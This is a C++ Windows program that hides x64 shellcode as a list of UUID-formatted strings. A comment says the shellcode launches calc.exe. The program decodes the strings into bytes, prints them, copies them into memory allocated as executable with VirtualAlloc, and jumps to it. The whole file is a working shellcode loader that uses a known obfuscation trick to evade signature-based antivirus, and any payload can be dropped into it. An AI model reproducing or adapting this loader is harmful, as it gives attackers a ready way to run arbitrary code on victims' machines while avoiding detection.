#include <stdio.h>
#include <windows.h>
#include <iostream>
#include <sstream>
#include <vector>
#include <iomanip>
#pragma warning

// run calc.exe
std::vector<std::string> sID = {
"554889e5-4883-ec40-4831-c0488945f848",
"8945f048-8945-e848-8945-e0488945d848",
"8945d048-8945-c850-48b8-57696e457865",
"631148c1-e008-48c1-e808-50488965d848",
"31c0b060-6548-8b00-488b-4018488b4020",
"488b0048-8b00-488b-4020-4889c34831c9",
"8b433c48-01d8-4831-c980-c1888b040848",
"01d88b48-1448-894d-f88b-481c4801d948",
"894df08b-4820-4801-d948-894de88b4824",
"4801d948-894d-e048-31c0-4831c9488b75",
"d8488b7d-e8fc-8b3c-8748-01dfb108f3a6",
"740948ff-c048-3b45-f875-e2488b4de048",
"8b55f066-8b04-418b-0482-4801d8eb0048",
"31d24831-c951-48b9-6361-6c632e657865",
"514889e1-b201-4883-e4f0-4883ec20ffd0",
"4883c438-4883-c418-4883-c4085dc3" };

//Remove dashes from UUIDs
void removeDashes(std::string& str) {
    str.erase(std::remove(str.begin(), str.end(), '-'), str.end());
}

//Convert UUIDs back to Shellcode bytes
std::vector<uint8_t> convertToBytes(const std::vector<std::string>& inputStrings) {
    std::vector<uint8_t> byteArray;

    for (const auto& str : inputStrings) {
        std::string cleanStr = str;
        removeDashes(cleanStr);

        for (size_t i = 0; i < cleanStr.length(); i += 2) {
            if (i + 1 < cleanStr.length()) {
                std::string byteString = cleanStr.substr(i, 2);
                uint8_t byte = static_cast<uint8_t>(std::stoi(byteString, nullptr, 16));
                byteArray.push_back(byte);
            }
        }
    }

    return byteArray;
}

int main() {
    std::vector<std::string> input = sID;
    std::vector<uint8_t> result = convertToBytes(input);
    unsigned char* Payload = reinterpret_cast<unsigned char*>(result.data());
    size_t byteArrayLength = result.size();
    std::cout << "[x] Payload size: " << byteArrayLength << " bytes" << std::endl;

    for (size_t i = 0; i < byteArrayLength; ++i) {
        std::cout << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(Payload[i]) << " ";

        if ((i + 1) % 8 == 0) {
            std::cout << std::endl;
        }
    }

    void* (*memcpyPtr) (void*, const void*, size_t);
    void* love = VirtualAlloc(0, byteArrayLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpyPtr = &memcpy;

	memcpyPtr(love, Payload, byteArrayLength);
	((void(*)())love)();
    return 0;
}
